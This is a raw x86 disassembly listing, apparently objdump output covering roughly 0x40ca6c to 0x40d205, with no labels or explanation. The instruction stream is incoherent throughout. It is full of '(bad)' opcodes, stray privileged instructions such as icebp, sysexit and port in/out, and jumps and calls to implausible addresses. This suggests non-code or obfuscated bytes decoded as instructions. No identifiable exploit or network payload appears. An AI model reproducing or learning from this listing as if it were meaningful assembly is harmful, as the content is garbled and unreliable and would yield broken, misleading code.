  40ca6c:	mov    esi,0xf874853b
  40ca71:	mov    edx,edx
  40ca73:	or     bh,bh
  40ca75:	ret    0x4566
  40ca78:	or     bl,ch
  40ca7a:	or     BYTE PTR [ebx-0x7699f800],cl
  40ca80:	retf   0x4283
  40ca83:	add    al,BYTE PTR [eax]
  40ca85:	mov    bh,0x66
  40ca87:	adc    dl,cl
  40ca89:	iret   
  40ca8a:	mov    edx,0x66c400c7
  40ca8f:	dec    edx
  40ca91:	(bad)  
  40ca92:	push   edi
  40ca93:	mov    edx,0x66b70057
  40ca98:	mov    edx,0xffdf8df8
  40ca9d:	rcl    BYTE PTR [edi+0x66],0x51
  40caa1:	add    bh,BYTE PTR [ebx+0x5e4f45]
  40caa7:	ret    0x3b
  40caaa:	jne    0x40ca37
  40caac:	mov    DWORD PTR [ebx+0x457218fc],eax
  40cab2:	xor    esi,DWORD PTR ds:0xc7339c8b
  40cab8:	callw  0x5048
  40cabc:	cmp    al,0xf8
  40cabe:	fs inc ebp
  40cac0:	mov    ebx,0x83b35
  40cac5:	pop    es
  40cac6:	sub    ebx,DWORD PTR [esi-0x7675cd45]
  40cacc:	add    al,bh
  40cace:	xor    eax,DWORD PTR [ebp-0x45]
  40cad1:	cmp    eax,0xc7009c4e
  40cad6:	cmp    esi,esp
  40cad8:	jne    0x40ca5f
  40cada:	cmp    eax,0x338545fc
  40cae0:	clc    
  40cae1:	pushf  
  40cae2:	pop    ebx
  40cae3:	mov    eax,DWORD PTR ds:0xeb57c0ec
  40cae9:	push   ecx
  40caea:	xor    ecx,DWORD PTR [ebx-0x7b3c07a2]
  40caf0:	mov    ebx,DWORD PTR [esi-0x74bacdaf]
  40caf6:	psubsb mm1,QWORD PTR [eax]
  40caf9:	icebp  
  40cafa:	lea    ecx,[eax]
  40cafc:	clc    
  40cafd:	pop    es
  40cafe:	inc    ecx
  40cb00:	mov    esi,0x8a72
  40cb05:	push   ebp
  40cb06:	xor    ecx,DWORD PTR [edi]
  40cb08:	mov    edi,0xc24ed1
  40cb0d:	adc    DWORD PTR [ebp+0x0],0x66
  40cb11:	add    bh,al
  40cb13:	inc    ebp
  40cb14:	sub    ecx,DWORD PTR [ebx-0x3ed407bb]
  40cb1a:	mov    DWORD PTR [ebp+0x8],ecx
  40cb1d:	add    DWORD PTR [ebx],0x66514557
  40cb23:	or     DWORD PTR [edx],0xf32c29e
  40cb29:	cmp    edi,DWORD PTR [esi+esi*2]
  40cb2c:	mov    ecx,DWORD PTR [ebx+0x45f80881]
  40cb32:	dec    DWORD PTR [ebx+0x4db80c33]
  40cb38:	dec    esi
  40cb39:	mov    eax,DWORD PTR [eax]
  40cb3b:	mov    DWORD PTR [ebx],edi
  40cb3d:	mov    esi,DWORD PTR [ebp+0x4]
  40cb40:	xor    ecx,DWORD PTR [eax+0x5f]
  40cb43:	mov    ecx,DWORD PTR [ecx-0x3a87410]
  40cb49:	push   ecx
  40cb4a:	leave  
  40cb4b:	mov    eax,DWORD PTR [eax+edi*8]
  40cb4e:	push   ebp
  40cb4f:	test   ah,ch
  40cb51:	sahf   
  40cb52:	in     al,dx
  40cb53:	xor    al,bh
  40cb55:	mov    esp,ebp
  40cb57:	clc    
  40cb58:	test   DWORD PTR [ebp-0x74baff08],ebx
  40cb5e:	xor    al,0x10
  40cb60:	pushf  
  40cb61:	dec    ebp
  40cb62:	mov    ebp,DWORD PTR [ebx]
  40cb64:	in     al,dx
  40cb65:	mov    edx,DWORD PTR [edi-0xc]
  40cb68:	push   ecx
  40cb69:	icebp  
  40cb6a:	add    eax,0x77208
  40cb6f:	rol    DWORD PTR [ebp+0x72],0xc7
  40cb73:	add    al,dh
  40cb75:	rol    DWORD PTR [ebp+0x4545f827],0x3
  40cb7c:	xor    eax,edi
  40cb7e:	pushf  
  40cb7f:	dec    ebp
  40cb80:	mov    DWORD PTR [ebx],0x985f8fc
  40cb86:	clc    
  40cb87:	or     BYTE PTR [ebp+0x45],al
  40cb8a:	xor    eax,0x7080835
  40cb8f:	pop    es
  40cb90:	dec    ebp
  40cb91:	dec    ebp
  40cb92:	lea    ecx,[ebp+0x72720101]
  40cb98:	add    BYTE PTR [eax],al
  40cb9a:	dec    ebp
  40cb9b:	inc    ebp
  40cb9c:	sub    ebx,0x10518b57
  40cba2:	or     DWORD PTR [ebp-0x62],0x8b8b322b
  40cba9:	cld    
  40cbaa:	adc    cl,dh
  40cbac:	scas   eax,DWORD PTR es:[edi]
  40cbad:	or     BYTE PTR [ebx],bh
  40cbaf:	pop    es
  40cbb0:	xadd   ebp,ebp
  40cbb3:	jb     0x40cbb5
  40cbb5:	add    BYTE PTR [ebx+0x4d2910c1],cl
  40cbbb:	inc    ebp
  40cbbc:	sub    eax,DWORD PTR [ebx]
  40cbbe:	mov    edi,eax
  40cbc0:	lock dec ebp
  40cbc2:	icebp  
  40cbc3:	add    ecx,DWORD PTR [eax]
  40cbc5:	clc    
  40cbc6:	pop    es
  40cbc7:	mov    eax,ecx
  40cbc9:	data16 jb 0x40cbd4
  40cbcc:	add    BYTE PTR [ebp-0x3f],al
  40cbcf:	xor    eax,0x7450830
  40cbd4:	add    ecx,DWORD PTR [ebp-0x8]
  40cbd7:	lea    ecx,[ebp+0x1]
  40cbda:	add    esi,DWORD PTR [edx-0x8]
  40cbdd:	add    BYTE PTR [ecx],dl
  40cbdf:	inc    ebp
  40cbe0:	adc    bl,ch
  40cbe2:	dec    ecx
  40cbe3:	mov    ecx,DWORD PTR [ecx+0x45450408]
  40cbe9:	mov    esi,DWORD PTR ds:0x74d080c
  40cbef:	mov    cl,BYTE PTR [ebp-0x78]
  40cbf2:	lea    ecx,[ebx-0x768d07ff]
  40cbf8:	add    al,bh
  40cbfa:	inc    ebp
  40cbfb:	in     al,0xe9
  40cbfd:	inc    DWORD PTR [eax]
  40cbff:	leave  
  40cc00:	add    BYTE PTR [eax*2-0x71374ab],cl
  40cc07:	push   ecx
  40cc08:	rol    DWORD PTR [ebp+0x4d],0x35
  40cc0c:	sbb    DWORD PTR [edi+edx*2-0x7e07ae39],0x32f89e85
  40cc17:	sar    BYTE PTR [ebx],0x74
  40cc1a:	jbe    0x40cba7
  40cc1c:	mov    edi,esp
  40cc1e:	or     BYTE PTR [edi+0x45],dl
  40cc21:	push   ecx
  40cc22:	mov    eax,DWORD PTR ds:0x4d720c
  40cc28:	mov    eax,DWORD PTR [ebp-0x77]
  40cc2b:	jne    0x40cbb8
  40cc2d:	jmp    0x40cc23
  40cc2f:	mov    edx,DWORD PTR [edi-0x8]
  40cc32:	push   ecx
  40cc33:	push   edi
  40cc34:	mov    edx,DWORD PTR [ecx-0x8]
  40cc37:	add    eax,0x9e7284
  40cc3c:	xor    cl,BYTE PTR [ebp-0x77]
  40cc3f:	sub    edi,eax
  40cc41:	mov    DWORD PTR [ebx+0xc],ebx
  40cc44:	inc    ebp
  40cc45:	inc    ebp
  40cc46:	mov    esi,DWORD PTR ds:0x7c108f8
  40cc4c:	dec    ebp
  40cc4d:	sahf   
  40cc4e:	xor    DWORD PTR [edx],0x8518b57
  40cc54:	or     DWORD PTR [ebp-0x62],0x3beb3288
  40cc5b:	leave  
  40cc5c:	jbe    0x40cc66
  40cc5e:	mov    edx,DWORD PTR [ebp+0x8]
  40cc61:	in     al,dx
  40cc62:	inc    ebp
  40cc63:	in     al,dx
  40cc64:	mov    eax,DWORD PTR [edx]
  40cc66:	or     al,0x0
  40cc68:	dec    ebp
  40cc69:	inc    ebp
  40cc6a:	xor    ax,0x9c09
  40cc6e:	mov    edi,eax
  40cc70:	mov    esi,eax
  40cc72:	cld    
  40cc73:	test   DWORD PTR [edi-0x8],edx
  40cc76:	push   ecx
  40cc77:	inc    ebp
  40cc78:	mov    ecx,DWORD PTR [ebx-0x3f7bf708]
  40cc7e:	sahf   
  40cc7f:	pop    es
  40cc80:	xor    al,al
  40cc82:	mov    DWORD PTR [ebp-0x74e8ff08],esp
  40cc88:	inc    ebp
  40cc89:	or     al,0x3
  40cc8b:	sar    al,0xf2
  40cc8e:	dec    ebp
  40cc8f:	lea    eax,[ebx]
  40cc91:	in     al,0xf8
  40cc93:	dec    DWORD PTR [ecx]
  40cc95:	mov    DWORD PTR [eax],ecx
  40cc97:	cld    
  40cc98:	inc    ebp
  40cc99:	inc    ebp
  40cc9a:	inc    eax
  40cc9b:	mov    DWORD PTR [ebp-0x14],eax
  40cc9e:	jmp    0xff97cae8
  40cca3:	mov    edi,0x70008c2
  40cca8:	mov    eax,edi
  40ccaa:	push   ecx
  40ccab:	sahf   
  40ccac:	(bad)  
  40ccad:	xor    bh,ah
  40ccaf:	add    eax,DWORD PTR [ebp+0x4510f889]
  40ccb5:	inc    ebp
  40ccb6:	xor    al,0xe8
  40ccb8:	pushf  
  40ccb9:	std    
  40ccba:	xor    edi,edi
  40ccbc:	inc    eax
  40ccbd:	fadd   DWORD PTR [eax+0x45]
  40ccc0:	inc    ebp
  40ccc1:	mov    esi,DWORD PTR ds:0x7510814
  40ccc7:	inc    ebp
  40ccc8:	sahf   
  40ccc9:	xor    DWORD PTR [edx],0x8
  40cccc:	cmp    DWORD PTR [ebp+0xc],eax
  40cccf:	mov    eax,DWORD PTR [edx]
  40ccd1:	clc    
  40ccd2:	sub    al,0x40
  40ccd4:	inc    ebp
  40ccd5:	call   0xff49c80f
  40ccda:	pop    es
  40ccdb:	inc    ebp
  40ccdc:	sahf   
  40ccdd:	push   DWORD PTR [edx]
  40ccdf:	adc    BYTE PTR [ebx-0x3717f3ab],cl
  40cce5:	std    
  40cce6:	dec    ebp
  40cce7:	dec    DWORD PTR [ebx+0x5708fcdb]
  40cced:	inc    ebp
  40ccee:	push   ecx
  40ccef:	call   0xffb3c8f9
  40ccf4:	add    BYTE PTR [ebp+0x4d],al
  40ccf7:	xor    eax,DWORD PTR [ebx]
  40ccf9:	add    ecx,DWORD PTR [eax+edx*2]
  40ccfc:	add    DWORD PTR [ebp-0x45],esi
  40ccff:	inc    edx
  40cd01:	cld    
  40cd02:	add    BYTE PTR [ecx],dh
  40cd04:	mov    edi,edi
  40cd06:	or     DWORD PTR [ebx-0x30ff0be4],0xc1f4cec7
  40cd10:	test   DWORD PTR [esi],ebx
  40cd12:	clc    
  40cd13:	inc    ebp
  40cd14:	inc    ebp
  40cd15:	mov    esi,DWORD PTR [ecx+ecx*4]
  40cd18:	pushf  
  40cd19:	or     al,0x8b
  40cd1b:	inc    ebp
  40cd1c:	adc    BYTE PTR [ebx-0x3f7af3bb],cl
  40cd22:	jne    0x40cd5f
  40cd24:	xor    esi,DWORD PTR [ebp-0x17]
  40cd27:	xor    eax,DWORD PTR [eax]
  40cd29:	pop    edi
  40cd2a:	add    BYTE PTR [ebx+0x45],bl
  40cd2d:	ret    0x85
  40cd30:	je     0x40cd77
  40cd32:	push   ebx
  40cd33:	mov    eax,DWORD PTR [ebp-0xe02e8]
  40cd39:	mov    eax,DWORD PTR [ebp-0x75]
  40cd3c:	mov    ecx,DWORD PTR [esp+ecx*1]
  40cd3f:	in     al,dx
  40cd40:	inc    ebp
  40cd41:	or     DWORD PTR [ebx+0x5753f408],0x57
  40cd48:	push   edi
  40cd49:	test   BYTE PTR [ecx+0x0],dl
  40cd4c:	xor    eax,DWORD PTR [eax]
  40cd4e:	mov    esi,0x8472c0
  40cd53:	add    dh,al
  40cd55:	add    BYTE PTR [ebp-0x49],al
  40cd58:	mov    esp,DWORD PTR [eax]
  40cd5a:	or     al,0xc8
  40cd5c:	add    BYTE PTR [ebp-0x1],al
  40cd5f:	xor    ecx,DWORD PTR [ebx+0x8f88b21]
  40cd65:	inc    edx
  40cd66:	inc    eax
  40cd67:	add    bl,ch
  40cd69:	xor    ecx,DWORD PTR [ebx-0x17f7f37f]
  40cd6f:	add    BYTE PTR [ecx+0x45f4f889],cl
  40cd75:	mov    eax,DWORD PTR gs:[eax]
  40cd78:	sub    cl,cl
  40cd7a:	retf   0xff7e
  40cd7d:	mov    WORD PTR [ebp+0x10],cx
  40cd81:	jae    0x40cdf8
  40cd83:	lea    ecx,[ebx+0x63fffcf8]
  40cd89:	xor    edi,edi
  40cd8b:	jne    0x8bcc42de
  40cd91:	or     al,0xfc
  40cd93:	or     al,0x3e
  40cd95:	push   WORD PTR [ecx-0x75]
  40cd99:	jne    0x40cd8b
  40cd9b:	cmpxchg8b QWORD PTR [ecx]
  40cd9e:	(bad)  
  40cd9f:	mov    edx,0x66ec00ff
  40cda4:	jne    0x40cd75
  40cda6:	call   0xff9ec6b7
  40cdab:	cmovge edi,edx
  40cdae:	xor    edi,DWORD PTR [ebx+eax*1]
  40cdb1:	add    BYTE PTR [ebx],bh
  40cdb3:	sub    eax,0xf8b5d74
  40cdb8:	or     al,0xfa
  40cdba:	add    BYTE PTR [edi],cl
  40cdbc:	inc    ebp
  40cdbd:	cmp    al,0x8b
  40cdbf:	mov    ebx,0x4d3b08
  40cdc4:	sub    DWORD PTR [ebx],0x14
  40cdc7:	enterw 0x9ff8,0x3b
  40cdcc:	shl    BYTE PTR [esi+ebx*2+0x6a],0xc9
  40cdd1:	pop    edi
  40cdd2:	or     al,0x45
  40cdd4:	mov    esp,DWORD PTR [esi-0x8]
  40cdd7:	dec    ebp
  40cdd8:	inc    eax
  40cdd9:	data16 jmp 0x40ce29
  40cddc:	push   ebp
  40cddd:	jb     0x40cdcb
  40cddf:	jmp    0x40ce26
  40cde1:	inc    DWORD PTR [ebx+0x7d7f10f8]
  40cde7:	mov    eax,DWORD PTR [eax]
  40cde9:	or     BYTE PTR [esi-0x49],dl
  40cdec:	jo     0x7440ffa1
  40cdf2:	test   DWORD PTR [edx+0xf],eax
  40cdf5:	jmp    DWORD PTR [edi+0xf77000f]
  40cdfb:	inc    DWORD PTR [eax+0x33]
  40cdfe:	mov    ebx,DWORD PTR [edi-0x77]
  40ce01:	pop    ebx
  40ce02:	lock ret 0xd2
  40ce06:	push   ebp
  40ce07:	dec    ebp
  40ce08:	mov    eax,0xf88a81
  40ce0d:	dec    eax
  40ce0f:	ror    ax,0x3b
  40ce13:	rol    BYTE PTR [eax],0x3b
  40ce16:	dec    ebp
  40ce17:	lock adc DWORD PTR [esp+edi*8+0x6a5533eb],0xffffffec
  40ce20:	pop    edi
  40ce21:	in     al,dx
  40ce22:	cmp    edx,DWORD PTR [edi-0xc]
  40ce25:	clc    
  40ce26:	xchg   DWORD PTR fs:[edx-0xff3bff],esi
  40ce2d:	cmp    al,dh
  40ce2f:	jne    0x40cde8
  40ce31:	xor    edi,esp
  40ce33:	jmp    0xcdcf95
  40ce38:	mov    ebp,DWORD PTR [ecx+edi*1]
  40ce3b:	jne    0x40ce3f
  40ce3d:	call   0xfff8cb79
  40ce42:	mov    edi,0x14e97
  40ce47:	add    BYTE PTR [ebx],bh
  40ce49:	inc    edi
  40ce4a:	jne    0x40cdd5
  40ce4c:	mov    esi,DWORD PTR [eax+ecx*1-0x7f7648b9]
  40ce53:	mov    eax,0x8974471f
  40ce58:	mov    edi,DWORD PTR [eax+ecx*1+0x6600b787]
  40ce5f:	add    BYTE PTR [esi+0x88d1f45],bh
  40ce65:	stos   BYTE PTR es:[edi],al
  40ce66:	add    BYTE PTR [eax],al
  40ce68:	mov    bx,di
  40ce6b:	les    esi,FWORD PTR [ebx]
  40ce6d:	xchg   DWORD PTR [esi+0x0],esp
  40ce70:	iret   
  40ce71:	add    BYTE PTR [edx],dl
  40ce73:	inc    ebp
  40ce74:	jl     0x40ce03
  40ce76:	(bad)  
  40ce77:	out    dx,al
  40ce78:	cld    
  40ce79:	add    BYTE PTR [ebx+0x39ccf489],cl
  40ce7f:	xchg   esp,edi
  40ce81:	add    DWORD PTR [eax+eax*1-0x72babafa],ebp
  40ce88:	push   0x32
  40ce8a:	pop    edi
  40ce8b:	add    BYTE PTR [ebp-0x77],dh
  40ce8e:	paddq  mm1,mm2
  40ce91:	xchg   DWORD PTR [ecx+eax*1],edi
  40ce94:	add    BYTE PTR [eax],al
  40ce96:	adc    ecx,DWORD PTR [ecx+0x457cb083]
  40ce9c:	test   eax,ebp
  40ce9e:	inc    DWORD PTR [eax]
  40cea0:	inc    DWORD PTR [eax]
  40cea2:	ror    BYTE PTR [ebx+0xc9a85e],0x8
  40cea9:	dec    DWORD PTR [ebx-0x3e020718]
  40ceaf:	inc    esp
  40ceb1:	inc    ebp
  40ceb2:	inc    DWORD PTR [ebp-0x52ccf0cd]
  40ceb8:	data16 add BYTE PTR [ebp-0x75],cl
  40cebc:	(bad)  
  40cebe:	rcl    BYTE PTR [esi-0x1e],0x74
  40cec2:	mov    edi,DWORD PTR [eax-0x7d]
  40cec5:	lock push eax
  40cec7:	jle    0x40ce54
  40cec9:	mov    ecx,DWORD PTR [ebx+0x56a81c]
  40cecf:	mov    eax,DWORD PTR [ebx+0x7f80018]
  40ced5:	jge    0x40ce97
  40ced7:	mov    esi,DWORD PTR [eax]
  40ced9:	adc    al,0x0
  40cedb:	enter  0xd06a,0xff
  40cedf:	dec    ebp
  40cee0:	or     BYTE PTR [ecx+0x7dffe4c1],cl
  40cee6:	mov    edi,DWORD PTR [ebx]
  40cee8:	lods   al,BYTE PTR ds:[esi]
  40cee9:	ja     0x40ceeb
  40ceeb:	mov    DWORD PTR [ebp+0x45db22f8],ecx
  40cef1:	pop    ebp
  40cef2:	lea    edi,[ecx]
  40cef4:	inc    esp
  40cef5:	clc    
  40cef6:	inc    ebp
  40cef7:	outs   dx,BYTE PTR ds:[esi]
  40cef8:	lea    eax,[ebx]
  40cefa:	push   bp
  40cefc:	inc    ebp
  40cefd:	mov    ecx,DWORD PTR [ebp+0xb788e0]
  40cf03:	pop    edi
  40cf04:	mov    DWORD PTR [esi-0x40],ebx
  40cf07:	jae    0x40ce90
  40cf09:	cmp    eax,DWORD PTR [eax]
  40cf0b:	adc    al,0x0
  40cf0d:	pop    eax
  40cf0e:	inc    ebp
  40cf0f:	sbb    al,0x8d
  40cf11:	mov    ecx,esp
  40cf13:	or     BYTE PTR [eax],al
  40cf15:	cmp    al,0x89
  40cf17:	mov    eax,ecx
  40cf19:	cld    
  40cf1a:	xchg   DWORD PTR [ebp+0x0],edx
  40cf1d:	add    eax,DWORD PTR [eax]
  40cf1f:	add    eax,DWORD PTR [ebp+0x2b]
  40cf22:	lea    ecx,[eax]
  40cf24:	adc    BYTE PTR [ebp+0x0],al
  40cf27:	or     ecx,DWORD PTR [ecx-0x78763000]
  40cf2d:	fadd   QWORD PTR [ecx]
  40cf2f:	push   ebp
  40cf30:	add    BYTE PTR [ebx+0x1b8d0045],al
  40cf36:	push   esp
  40cf37:	inc    ebp
  40cf38:	add    bh,bh
  40cf3a:	push   edi
  40cf3b:	adc    BYTE PTR [ebp-0x18],bh
  40cf3e:	mov    ebp,edi
  40cf40:	fdivr  st,st(7)
  40cf42:	cli    
  40cf43:	dec    ebp
  40cf44:	add    BYTE PTR [ebp-0x74788bb0],al
  40cf4a:	add    esp,edi
  40cf4c:	add    BYTE PTR [eax],bh
  40cf4e:	xor    BYTE PTR [ebp-0x51],al
  40cf51:	cmp    edi,0xfffffffc
  40cf54:	mov    edi,edi
  40cf56:	lock in al,dx
  40cf58:	rcl    ah,0x84
  40cf5b:	pop    ebp
  40cf5c:	add    BYTE PTR [ebx+0x0],al
  40cf5f:	pop    ebp
  40cf60:	dec    eax
  40cf61:	cmp    edx,DWORD PTR [ebx-0x8]
  40cf64:	mov    edx,DWORD PTR [ecx+eax*1-0x7436fca5]
  40cf6b:	add    al,0x24
  40cf6d:	push   ebp
  40cf6e:	dec    esi
  40cf6f:	in     al,dx
  40cf70:	mov    eax,DWORD PTR [ebp+0x20]
  40cf73:	push   esi
  40cf74:	pop    esi
  40cf75:	mov    al,0x3
  40cf77:	add    DWORD PTR [ecx+0x7eb0e000],ecx
  40cf7d:	add    DWORD PTR [ebx],eax
  40cf7f:	add    BYTE PTR [ebx],al
  40cf81:	inc    ebp
  40cf82:	mov    eax,ebp
  40cf84:	hlt    
  40cf85:	(bad)  
  40cf86:	push   ebp
  40cf87:	dec    DWORD PTR [ecx-0x4fe07f2]
  40cf8d:	push   es
  40cf8e:	add    ecx,ecx
  40cf90:	pop    ebp
  40cf91:	or     BYTE PTR [ebx],dh
  40cf93:	jns    0x5e02b85a
  40cf99:	ret    0x76
  40cf9c:	jmp    0x40cf2d
  40cf9e:	mov    eax,DWORD PTR [ecx]
  40cfa0:	in     al,0x0
  40cfa2:	jge    0x40cf8f
  40cfa4:	sysexit 
  40cfa6:	cmp    al,0x8a
  40cfa8:	cmp    eax,DWORD PTR [eax]
  40cfaa:	sbb    BYTE PTR [eax],cl
  40cfac:	pop    ebp
  40cfad:	add    BYTE PTR [esi+0x66],bh
  40cfb0:	jae    0x40cfb3
  40cfb2:	mov    eax,ecx
  40cfb4:	call   0xb9b7:0x8b025583
  40cfbb:	mov    ebx,0x8d4e55
  40cfc0:	mov    al,0x3b
  40cfc2:	fdiv   DWORD PTR [ebp-0x8]
  40cfc5:	xor    edx,DWORD PTR [ebp+0x66]
  40cfc8:	mov    DWORD PTR [ecx],0x10087ec
  40cfce:	add    BYTE PTR [eax],al
  40cfd0:	push   ebp
  40cfd1:	ret    
  40cfd2:	mov    ecx,DWORD PTR [ebx-0x77c57404]
  40cfd8:	jne    0x40cfda
  40cfda:	mov    eax,ecx
  40cfdc:	fadd   QWORD PTR [esi]
  40cfde:	xor    al,0xc7
  40cfe0:	push   ebx
  40cfe1:	or     dh,dh
  40cfe3:	icebp  
  40cfe4:	inc    DWORD PTR [eax+0x8f4358b]
  40cfea:	rol    BYTE PTR [edx+0x5],0xa
  40cfee:	inc    ebp
  40cfef:	stc    
  40cff0:	mov    DWORD PTR [ebp-0x75],esi
  40cff3:	(bad)  
  40cff4:	lock add BYTE PTR [ebp-0x7a],al
  40cff8:	add    al,0x1
  40cffa:	dec    ebp
  40cffb:	add    BYTE PTR [ebp-0x39],dh
  40cffe:	mov    eax,ebx
  40d000:	call   0xe8c45990
  40d005:	sbb    al,0x5d
  40d007:	mov    edi,0xf85e8572
  40d00c:	pop    edi
  40d00d:	jge    0x40cfd1
  40d00f:	lea    eax,[eax]
  40d011:	dec    DWORD PTR [ebx+0x88b8b45]
  40d017:	or     bh,bh
  40d019:	leave  
  40d01a:	fadd   DWORD PTR [eax+eax*1-0x67ff7300]
  40d021:	dec    ebp
  40d022:	add    BYTE PTR [ebp-0xff7f075],al
  40d028:	xchg   ebp,eax
  40d029:	add    bh,bh
  40d02b:	mov    ecx,DWORD PTR [ebx-0x74b276f0]
  40d031:	mov    esi,DWORD PTR [ebx]
  40d033:	or     al,0x39
  40d035:	dec    ebp
  40d036:	pop    esi
  40d037:	mov    edx,DWORD PTR [ebp+0x5d458b08]
  40d03d:	in     al,0x4
  40d03f:	pushf  
  40d040:	mov    ecx,DWORD PTR [ecx-0x76ff1378]
  40d046:	push   ebx
  40d047:	call   0xc83595f
  40d04c:	add    BYTE PTR [ebp+0x5],cl
  40d04f:	(bad)  
  40d050:	cmp    edx,DWORD PTR [eax]
  40d052:	add    BYTE PTR [ebp+0x5783f889],al
  40d058:	add    dl,BYTE PTR [ecx-0x3e]
  40d05b:	mov    ebx,0xff028d0f
  40d060:	mov    edx,0x66330045
  40d065:	mov    eax,ebx
  40d067:	sub    esp,eax
  40d069:	add    eax,eax
  40d06b:	clc    
  40d06c:	mov    DWORD PTR [ebx-0x7477ff75],edx
  40d072:	add    BYTE PTR [ebx+ebx*2],cl
  40d075:	dec    ebp
  40d076:	push   edi
  40d077:	xor    edi,eax
  40d079:	xor    eax,DWORD PTR [esi+0x8018d]
  40d07f:	in     eax,0xe7
  40d081:	add    BYTE PTR [ebx],al
  40d083:	inc    ebp
  40d084:	jmp    0x40d0b9
  40d086:	xor    bh,0x49
  40d089:	mov    ebp,ecx
  40d08b:	adc    BYTE PTR [eax-0x75ccbfb3],cl
  40d091:	xor    eax,DWORD PTR [eax-0x10c483d5]
  40d097:	jne    0x40d099
  40d099:	mov    ecx,DWORD PTR [ebx+0x458808]
  40d09f:	mov    eax,DWORD PTR [ebx]
  40d0a1:	hlt    
  40d0a2:	pop    edi
  40d0a3:	add    BYTE PTR [ebp-0x37],dl
  40d0a6:	in     al,dx
  40d0a7:	push   es
  40d0a8:	in     al,dx
  40d0a9:	dec    ecx
  40d0aa:	push   edi
  40d0ab:	xor    eax,0x4d9c1735
  40d0b0:	mov    DWORD PTR [eax+0x624757e8],eax
  40d0b6:	mov    ecx,edx
  40d0b8:	in     al,0x4d
  40d0ba:	dec    ebp
  40d0bb:	add    BYTE PTR [ebp-0x43df0a9],0xe9
  40d0c2:	add    dl,dl
  40d0c4:	mov    ecx,DWORD PTR [ebx+0x4dc9080c]
  40d0ca:	test   BYTE PTR [eax+0x8008b00],cl
  40d0d0:	dec    ebp
  40d0d1:	push   ebp
  40d0d2:	mov    DWORD PTR [eax+0x4d72f4],edi
  40d0d8:	mov    eax,ecx
  40d0da:	clc    
  40d0db:	into   
  40d0dc:	dec    ebp
  40d0dd:	retf   0x18c7
  40d0e0:	lock dec ebp
  40d0e2:	test   DWORD PTR [ebx-0x31baf308],ecx
  40d0e8:	push   ebx
  40d0e9:	(bad)  
  40d0ea:	jge    0x40d0b6
  40d0ec:	push   esi
  40d0ed:	enter  0xce45,0x89
  40d0f1:	dec    ebp
  40d0f2:	cld    
  40d0f3:	jmp    0xff74d03d
  40d0f8:	pushf  
  40d0f9:	inc    ebp
  40d0fa:	mov    esi,0x78b0833
  40d0ff:	sub    esp,DWORD PTR [edx+0x3]
  40d102:	int    0x8
  40d104:	mov    ecx,DWORD PTR [ebp+0xc]
  40d107:	mov    eax,esi
  40d109:	adc    bl,cl
  40d10b:	(bad)  
  40d10c:	enter  0x4d85,0xff
  40d110:	jmp    0x85d214
  40d115:	xor    eax,DWORD PTR [ebp+0x5e]
  40d118:	mov    ebp,ebx
  40d11a:	or     al,0x8b
  40d11c:	(bad)  
  40d11d:	call   0x51cd28f0
  40d122:	cmp    al,0x5
  40d124:	fs jb  0x40d0b2
  40d127:	add    BYTE PTR [eax],cl
  40d129:	leave  
  40d12a:	ror    BYTE PTR [ecx+esi*8],cl
  40d12d:	push   ebp
  40d12e:	inc    ebp
  40d12f:	in     al,dx
  40d130:	mov    ebp,esp
  40d132:	or     al,0xc7
  40d134:	(bad)  
  40d135:	lock into 
  40d137:	test   ecx,eax
  40d139:	clc    
  40d13a:	rol    BYTE PTR [ebp+0x34],1
  40d13d:	xor    al,0x45
  40d13f:	pushf  
  40d140:	add    ecx,DWORD PTR [ebx-0x7b27604]
  40d146:	mov    al,BYTE PTR [ebp-0x7b]
  40d149:	cmp    eax,0x56349c75
  40d14e:	sub    al,0xc7
  40d150:	jmp    0x40d13e
  40d152:	mov    ebx,DWORD PTR [eax]
  40d154:	lock jmp 0xf02a:0x8bb27df1
  40d15c:	mov    edx,DWORD PTR [edi-0x14]
  40d15f:	push   ecx
  40d160:	icebp  
  40d161:	xor    eax,DWORD PTR [edx]
  40d163:	mov    edx,0x627280
  40d168:	enter  0x4dc8,0xfa
  40d16c:	add    ecx,edx
  40d16e:	cld    
  40d16f:	scas   eax,DWORD PTR es:[edi]
  40d170:	add    ebx,ebp
  40d172:	dec    ebp
  40d173:	mov    ecx,DWORD PTR [ebx-0x618a1708]
  40d179:	xor    esi,DWORD PTR [edx]
  40d17b:	xor    ebp,DWORD PTR [ebx]
  40d17d:	add    esi,DWORD PTR [ebx]
  40d17f:	add    edi,DWORD PTR [ebx]
  40d181:	test   DWORD PTR [ebp-0x75],esi
  40d184:	mov    edi,eax
  40d186:	adc    BYTE PTR [ebp+0x55],cl
  40d189:	je     0x40d1be
  40d18b:	xor    esi,DWORD PTR [ebx]
  40d18d:	xor    ebp,DWORD PTR [ebx]
  40d18f:	add    ebp,DWORD PTR [ebx]
  40d191:	add    esi,DWORD PTR [ebx]
  40d193:	ror    DWORD PTR [ecx+0x68ec108b],cl
  40d199:	enter  0xcaff,0x8b
  40d19d:	icebp  
  40d19e:	or     al,0xa
  40d1a0:	(bad)  
  40d1a1:	lock retf 
  40d1a3:	enter  0xf2c8,0x4d
  40d1a7:	retf   0xee89
  40d1aa:	or     BYTE PTR [ebp+0x45],dh
  40d1ad:	mov    edi,DWORD PTR [ebx]
  40d1af:	cld    
  40d1b0:	bswap  eax
  40d1b2:	pop    edi
  40d1b3:	mov    esp,0x328b9eff
  40d1b8:	in     al,0x8b
  40d1ba:	(bad)  
  40d1bb:	hlt    
  40d1bc:	pop    ebx
  40d1bd:	jne    0x40d1c7
  40d1bf:	xor    eax,DWORD PTR [ebp+0x33]
  40d1c2:	xor    eax,0x73b082b
  40d1c7:	jbe    0x40d167
  40d1c9:	mov    esi,DWORD PTR [edx]
  40d1cb:	clc    
  40d1cc:	pop    edi
  40d1cd:	mov    edx,eax
  40d1cf:	mov    eax,DWORD PTR [eax]
  40d1d1:	clc    
  40d1d2:	mov    ecx,ecx
  40d1d4:	adc    DWORD PTR [ebp+0x14],0xffffffec
  40d1d8:	inc    ebp
  40d1d9:	in     al,dx
  40d1da:	xor    eax,0xc7009c04
  40d1df:	inc    ebp
  40d1e0:	cld    
  40d1e1:	xor    eax,0xc7f89c85
  40d1e6:	add    esi,esp
  40d1e8:	inc    ebp
  40d1e9:	test   edi,eax
  40d1eb:	clc    
  40d1ec:	hlt    
  40d1ed:	inc    ebp
  40d1ee:	test   DWORD PTR ds:0x53579cf8,esi
  40d1f4:	inc    ebp
  40d1f5:	inc    ebp
  40d1f6:	aad    0x36
  40d1f8:	xlat   BYTE PTR ds:[ebx]
  40d1f9:	pushf  
  40d1fa:	mov    ecx,DWORD PTR [ebx-0x41b21304]
  40d200:	mov    eax,0x7070808
  40d205:	xor    edi,eax
